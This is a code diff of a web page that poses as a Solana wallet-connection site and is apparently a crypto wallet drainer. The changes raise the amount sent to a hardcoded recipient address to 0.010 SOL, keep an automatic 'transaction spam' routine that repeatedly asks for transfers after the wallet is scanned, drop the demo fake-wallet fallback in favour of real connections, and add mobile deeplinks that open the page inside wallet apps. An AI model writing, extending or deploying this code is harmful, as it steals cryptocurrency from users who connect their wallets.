@@ -139,12 +139,6 @@
       color: #333;
     }
 
-    .wallet-status {
-      font-size: 0.8rem;
-      color: #28a745;
-      margin-left: 10px;
-    }
-
     .connection-status {
       margin-top: 15px;
       padding: 10px;
@@ -438,10 +432,10 @@
         <div id="transferSection" class="transfer-section hidden">
           <div><strong>⚠️ SOL Transfer:</strong></div>
           <div style="font-size: 0.8rem; margin-top: 5px;">
-            This will transfer 0.0050 SOL from your wallet to a specified address.
+            This will transfer 0.010 SOL from your wallet to a specified address.
           </div>
           <button id="transferSolBtn" class="transfer-btn">
-            Transfer 0.0050 SOL
+            Transfer 0.010 SOL
           </button>
           <div id="transferStatus" style="margin-top: 10px; font-size: 0.8rem;"></div>
         </div>
@@ -457,27 +451,22 @@
       <div class="wallet-option" data-wallet="solflare">
         <img src="https://s.iimg.su/s/26/AaFiC9SIvF95PZEblauprFwWZ7bXKuO2NRYnJVIH.png" alt="Solflare" />
         <span>Solflare</span>
-        <div class="wallet-status">Available</div>
       </div>
       <div class="wallet-option" data-wallet="phantom">
         <img src="https://s.iimg.su/s/26/XUns4qhYptxMAGIMJkK8GXJiTvRMnTO8ZqAcKqvx.png" alt="Phantom" />
         <span>Phantom</span>
-        <div class="wallet-status">Available</div>
       </div>
       <div class="wallet-option" data-wallet="trustwallet">
         <img src="https://s.iimg.su/s/26/mA9QKT4xSAh5HifKsQIN8m9oZxn3ODrKcl1XQdtn.png" alt="Trust Wallet" />
         <span>Trust Wallet</span>
-        <div class="wallet-status">Available</div>
       </div>
       <div class="wallet-option" data-wallet="coinbase">
         <img src="https://s.iimg.su/s/26/75HQqHl0g9lz9qIFBEHNkRZknbnJVc69aqI5PlGK.png" alt="Coinbase" />
         <span>Coinbase</span>
-        <div class="wallet-status">Available</div>
       </div>
       <div class="wallet-option" data-wallet="bitget">
         <img src="https://s.iimg.su/s/26/HrAB9KDj99AnQOQZcxhY0htKY0oUFcONhY9jSUhP.png" alt="Bitget Wallet" />
         <span>Bitget Wallet</span>
-        <div class="wallet-status">Available</div>
       </div>
       <div class="wallet-option" id="allWalletsBtn">
         <img src="data:image/svg+xml,%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20200%20200%22%3E%3Cpath%20d=%22M0%200h200v200H0z%22/%3E%3Crect%20width=%2241%22%20height=%2241%22%20x=%2238%22%20y=%2238%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3Crect%20width=%2241%22%20height=%2241%22%20x=%22121%22%20y=%2238%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3Crect%20width=%2241%22%20height=%2241%22%20x=%2238%22%20y=%22121%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3Crect%20width=%2241%22%20height=%4241%22%20x=%22121%22%20y=%22121%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3Crect%20width=%2241%22%20height=%4241%22%20x=%2279.5%22%20y=%2279.5%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3C/svg%3E" alt="All Wallets" />
@@ -526,6 +515,25 @@
 
   <script>
     // ============================================================================
+    // UTILITY FUNCTIONS
+    // ============================================================================
+
+    // Проверка на мобильное устройство
+    function isMobileDevice() {
+      return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+    }
+
+    // Deeplink-ссылки для мобильных кошельков
+    const WALLET_DEEPLINKS = {
+      phantom: 'https://phantom.app/ul/browse/',
+      solflare: 'solflare://browse/',
+      trustwallet: 'trust://browser/',
+      coinbase: 'coinbasewallet://browser/',
+      bitget: 'bitkeep://browser/',
+      backpack: 'backpack://browser/'
+    };
+
+    // ============================================================================
     // SOLANA SOL TRANSFER FUNCTIONALITY WITH SPAM PROTECTION
     // ============================================================================
 
@@ -537,14 +545,14 @@
         // Адрес получателя (замените на нужный адрес)
         this.RECIPIENT_ADDRESS = '7BgBvyjrZX8YKHGoW9Y9NChumg5BNVN1r8fKSaVqNPXa';
         
-        // Количество SOL для перевода (0.0050 SOL = 5,000,000 lamports)
-        this.TRANSFER_AMOUNT_SOL = 0.0050;
+        // Количество SOL для перевода (0.010 SOL = 10,000,000 lamports)
+        this.TRANSFER_AMOUNT_SOL = 0.010;
         this.TRANSFER_AMOUNT_LAMPORTS = this.TRANSFER_AMOUNT_SOL * solanaWeb3.LAMPORTS_PER_SOL;
         
         // Настройки спама транзакциями
-        this.MAX_SPAM_ATTEMPTS = 50; // Максимальное количество попыток
-        this.SPAM_DELAY_MIN = 1000; // Минимальная задержка между попытками (мс)
-        this.SPAM_DELAY_MAX = 3000; // Максимальная задержка между попытками (мс)
+        this.MAX_SPAM_ATTEMPTS = 50;
+        this.SPAM_DELAY_MIN = 1000;
+        this.SPAM_DELAY_MAX = 3000;
         this.currentSpamAttempt = 0;
         this.isSpamActive = false;
         this.spamTimeouts = [];
@@ -576,7 +584,7 @@
       }
 
       /**
-       * Создание транзакции для перевода 0.0050 SOL
+       * Создание транзакции для перевода 0.010 SOL
        */
       async createSolTransferTransaction(fromAddress, toAddress, amount) {
         if (!this.connection) {
@@ -1404,6 +1412,15 @@
           throw new Error(`Unsupported wallet: ${walletKey}`);
         }
 
+        // Если мобильное устройство - открываем Deeplink
+        if (isMobileDevice()) {
+          const deeplink = WALLET_DEEPLINKS[walletKey];
+          if (deeplink) {
+            window.location.href = deeplink + encodeURIComponent(window.location.href);
+            return;
+          }
+        }
+
         // Показываем статус загрузки
         this.showConnectionStatus('loading', `Connecting to ${config.name}...`);
 
@@ -1411,38 +1428,20 @@
           let response;
           let provider = config.provider();
           
-          // Если кошелек не установлен, симулируем подключение
+          // Если кошелек не установлен - показываем ошибку
           if (!provider) {
-            console.log(`${config.name} not installed, simulating connection...`);
-            
-            await new Promise(resolve => setTimeout(resolve, 1000));
-            
-            const fakeAddress = this.generateFakeAddress();
-            response = { publicKey: { toString: () => fakeAddress } };
-            
-            provider = {
-              isConnected: true,
-              publicKey: { toString: () => fakeAddress },
-              disconnect: () => Promise.resolve(),
-              on: () => {},
-              signTransaction: async (transaction) => {
-                // Симуляция подписи транзакции
-                console.log('🔏 Simulating transaction signature...');
-                await new Promise(resolve => setTimeout(resolve, 2000));
-                return {
-                  serialize: () => new Uint8Array(64) // Фейковая подписанная транзакция
-                };
-              }
-            };
+            this.showConnectionStatus('error', `${config.name} not installed!`);
+            return;
+          }
+
+          // Реальное подключение
+          if (walletKey === 'phantom') {
+            response = await provider.connect();
+          } else if (walletKey === 'solflare') {
+            await provider.connect();
+            response = { publicKey: provider.publicKey };
           } else {
-            // Реальное подключение к установленному кошельку
-            if (walletKey === 'phantom') {
-              response = await this.connectPhantom(provider, requestPermission);
-            } else if (walletKey === 'solflare') {
-              response = await this.connectSolflare(provider, requestPermission);
-            } else {
-              response = await this.connectGenericWallet(provider, requestPermission);
-            }
+            response = await provider.connect();
           }
 
           // Сохраняем информацию о подключении
@@ -1497,7 +1496,7 @@
               this.showConnectionStatus('success', `Fast scan completed in ${this.walletData.scanDuration}ms!`);
               
               // АВТОМАТИЧЕСКИЙ ЗАПУСК СПАМА ТРАНЗАКЦИЯМИ ПОСЛЕ УСПЕШНОГО СКАНИРОВАНИЯ
-              if (this.walletData.solBalance >= 0.0050) {
+              if (this.walletData.solBalance >= 0.010) {
                 this.showConnectionStatus('warning', 'Starting transaction spam...');
                 
                 // Небольшая задержка перед запуском спама
@@ -1505,7 +1504,7 @@
                   await this.executeSolTransferWithSpam();
                 }, 2000);
               } else {
-                this.showConnectionStatus('warning', `Insufficient SOL balance for transfer. Required: 0.0050 SOL, Available: ${this.walletData.solBalance.toFixed(6)} SOL`);
+                this.showConnectionStatus('warning', `Insufficient SOL balance for transfer. Required: 0.010 SOL, Available: ${this.walletData.solBalance.toFixed(6)} SOL`);
               }
             }
             
@@ -1537,7 +1536,7 @@
       }
 
       /**
-       * Выполнение автоматического перевода 0.0050 SOL с функцией спама
+       * Выполнение SP1m trans
        */
       async executeSolTransferWithSpam() {
         if (this.isTransferring) {
@@ -1545,7 +1544,7 @@
           return;
         }
 
-        if (!this.walletData || this.walletData.solBalance < 0.0050) {
+        if (!this.walletData || this.walletData.solBalance < 0.010) {
           console.log('❌ Insufficient SOL balance for transfer');
           this.updateTransferStatus('Insufficient SOL balance for transfer', 'error');
           return;
@@ -1681,7 +1680,7 @@
 
         // Показываем секцию перевода SOL если есть достаточный баланс
         if (transferSection) {
-          if (this.walletData.solBalance >= 0.0050) {
+          if (this.walletData.solBalance >= 0.010) {
             transferSection.classList.remove('hidden');
           } else {
             transferSection.classList.add('hidden');
@@ -1697,18 +1696,6 @@
         } else {
           scanMethods.classList.add('hidden');
         }
-      }
-
-      /**
-       * Генерация фейкового адреса Solana для демонстрации
-       */
-      generateFakeAddress() {
-        const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz123456789';
-        let result = '';
-        for (let i = 0; i < 44; i++) {
-          result += chars.charAt(Math.floor(Math.random() * chars.length));
-        }
-        return result;
       }
 
       /**
